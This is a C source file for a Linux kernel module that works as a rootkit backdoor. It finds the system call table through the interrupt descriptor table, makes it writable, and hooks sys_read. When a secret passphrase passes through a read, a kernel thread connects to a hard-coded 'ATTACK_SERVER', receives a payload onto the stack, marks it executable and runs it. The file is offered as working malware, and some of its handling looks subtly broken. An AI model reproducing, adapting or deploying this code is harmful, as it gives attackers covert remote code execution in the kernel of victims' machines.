/*
 * Writting by Sander Demeester
 * Based on code from E.B
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>

#include <linux/in.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/mman.h>

#include <net/sock.h>


#define __NR_READ 3
#define INADDRSZ 4
#define SERVER_PORT 5555
#define ATTACK_SERVER "192.168.1.15"
#define SECRET_PASSPHRASE "a good day to die hard"

MODULE_LICENSE("GPL");

typedef void (*sys_call_ptr_t)(void);
typedef asmlinkage long (*orig_read_t)(unsigned int fd, const char*buf, size_t count);
typedef asmlinkage long (*orig_dup_t)(int,int);
typedef asmlinkage long (*orig_execve_t)(const char, char*const, char*const);

void hexdump(unsigned char *addr, unsigned int length);
int inet_pton_pv(const char*src, unsigned char*dst);
void backdoor();

// Pointer to original sys_read call adres
orig_read_t origin_syscall = NULL;

// Pointer to dup2
orig_dup_t dup2_o = NULL;

// Pointer to sys_execve
orig_execve_t execve_o = NULL;

// Pointer to sys call table
sys_call_ptr_t*_sys_call_table = NULL;

// kthread status
int kthread_status;

// check value
int check = 0;

// kthread status
int thread_status = 0;

// Hooked syscall 
asmlinkage ssize_t evil_sys_read(unsigned int fd, char *buf, size_t count){
  ssize_t return_value = (*origin_syscall)(fd, buf, count);
  if(strstr(buf, SECRET_PASSPHRASE) != NULL && !check){
    printk("%s \n",buf);
    check = 1;
    thread_status = kthread_run(backdoor, NULL, "backdoor thread");
  }
  return return_value;
}
 
// Memory protection shinanigans
unsigned int level;
pte_t*pte;

// Init module
int init_module(){
  // Struct for IDT register contents
  struct desc_ptr idtr;
  
  // Pointer to IDT table of desc structs
  // List of event handler routines (please see desc.h header file)
  gate_desc *idt_table;

  // Gate struct for int 0x80 (128th interupt vector)
  gate_desc *sys_call_gate;

  // Systemcall gate offset and pointer
  unsigned int _system_call_offset;
  unsigned char*_system_call_ptr;

  unsigned int i;
  unsigned char *off;

  // Store IDT register into mem.
  asm("sidt %0" : "=m" (idtr));

#ifdef DEBUG
    /* 94 struct desc_ptr { */
    /* 95         unsigned short size; */
    /* 96         unsigned long address; */
    /* 97 } __attribute__((packed)) ; */
  printk(" IDT is at %08x\n", idtr.address);
#endif
  // Set pointer table.
  idt_table = (gate_desc*)idtr.address;
  
  // Get system call gate
  sys_call_gate = &idt_table[0x80]; // int 80x 
  
  _system_call_offset = (sys_call_gate->a & 0xffff) | (sys_call_gate->b & 0xffff0000);
  _system_call_ptr = (unsigned char*) _system_call_offset;

#ifdef DEUBG
  printk(" system_call is at %08x\n", _system_call_offset);
#endif
  
  // Thanks to E.B for pattern scanning in system_call interupt handler.
  // print out the first 128 bytes of system_call() ...notice pattern below
  hexdump((unsigned char *) _system_call_offset, 128);

  // scan for known pattern in system_call (int 0x80) handler
  // pattern is just before sys_call_table address
  for(i = 0; i < 128; i++) {
    off = _system_call_ptr + i;
    if(*(off) == 0xff && *(off+1) == 0x14 && *(off+2) == 0x85) {
      _sys_call_table = *(sys_call_ptr_t **)(off+3);
      break;
    }
  }

  if(_sys_call_table == NULL) return 0;
  
  // Save original sys_read (__NR_READ => 3)
  origin_syscall = (orig_read_t) _sys_call_table[__NR_READ];
  
  // Unprotected sys_call_table
  pte = lookup_address((unsigned long)_sys_call_table, &level);
  
  // Change PTE to allow writing
  set_pte_atomic(pte, pte_mkwrite(*pte));
  
#ifdef DEBUG
  printk("unprotcted kernel memory page containing syscall table\n");
#endif
  
  // Overwrite the __NR_READ entry with the adres of our hooked sys_read
  _sys_call_table[__NR_READ] = (sys_call_ptr_t) evil_sys_read;

  return 0;
}

void cleanup_module(){
  if(origin_syscall != NULL){
    // restore
    _sys_call_table[__NR_READ] = (sys_call_ptr_t) origin_syscall;
    
    // protect page
    set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
    
    if(!thread_status) kthread_stop(thread_status);
  }
}

void hexdump(unsigned char *addr, unsigned int length) {
  unsigned int i;
  for(i = 0; i < length; i++) {
    if(!((i+1) % 16)) {
      printk("%02x\n", *(addr + i));
    } else {
      if(!((i+1) % 4)) {
	printk("%02x  ", *(addr + i));
      } else {
	printk("%02x ", *(addr + i));
      }
    }
  }

  if(!((length+1) % 16)) {
    printk("\n");
  }
}

int inet_pton_pv(const char*src, unsigned char*dst){
  static const char digits[] = "0123456789";
  int saw_digit, octets, ch;
  unsigned char tmp[INADDRSZ], *tp;

  saw_digit = 0;
  octets = 0;
  tp = tmp;
  *tp = 0;
  while((ch = *src++) != '\0') {
    const char *pch;

    if((pch = strchr(digits, ch)) != NULL) {
      unsigned int val = *tp * 10 + (unsigned int)(pch - digits);

      if(saw_digit && *tp == 0)
        return (0);
      if(val > 255)
        return (0);
      *tp = (unsigned char)val;
      if(! saw_digit) {
        if(++octets > 4)
          return (0);
        saw_digit = 1;
      }
    }
    else if(ch == '.' && saw_digit) {
      if(octets == 4)
        return (0);
      *++tp = 0;
      saw_digit = 0;
    }
    else
      return (0);
  }
  if(octets < 4)
    return (0);
  memcpy(dst, tmp, INADDRSZ);
  return (1);
}

void backdoor(void*pt){
  struct sockaddr_in server_addr;
  struct socket *sk = NULL;

  char buffer[1000];
  mm_segment_t old_fs = get_fs();
  
  int pagesize = 4096;
  int ret = -1;

  printk("setup backdoor\n");
  ret = sock_create(AF_INET, SOCK_STREAM, 0, &sk);
  if(ret < 0) printk("sock_create failed\n");
  
  printk("creating sockaddr_in\n");
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  inet_pton_pv(ATTACK_SERVER, &server_addr.sin_addr);
  
  
  printk("%d %d \n", server_addr.sin_family, 
	 server_addr.sin_port);
  sk->ops->connect(sk, (struct sock_addr_in*)&server_addr, sizeof(server_addr), 0);  
  
  // revc our payload
  struct msghdr msg;
  struct iovec iov;

  iov.iov_base = (void*) &buffer[0];
  iov.iov_len = (__kernel_size_t)1000;

  msg.msg_name = NULL;
  msg.msg_namelen = 0;

  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;  
  
  set_fs(KERNEL_DS);

  ret = sock_recvmsg(sk, &msg, 1000, 0);
  set_fs(old_fs);

  pte_t *pte = lookup_address(&buffer[0], &level);
  set_pte_atomic(pte, pte_mkexec(*pte));
  printk("%x \n", buffer);
  ((void(*)())buffer)();
}
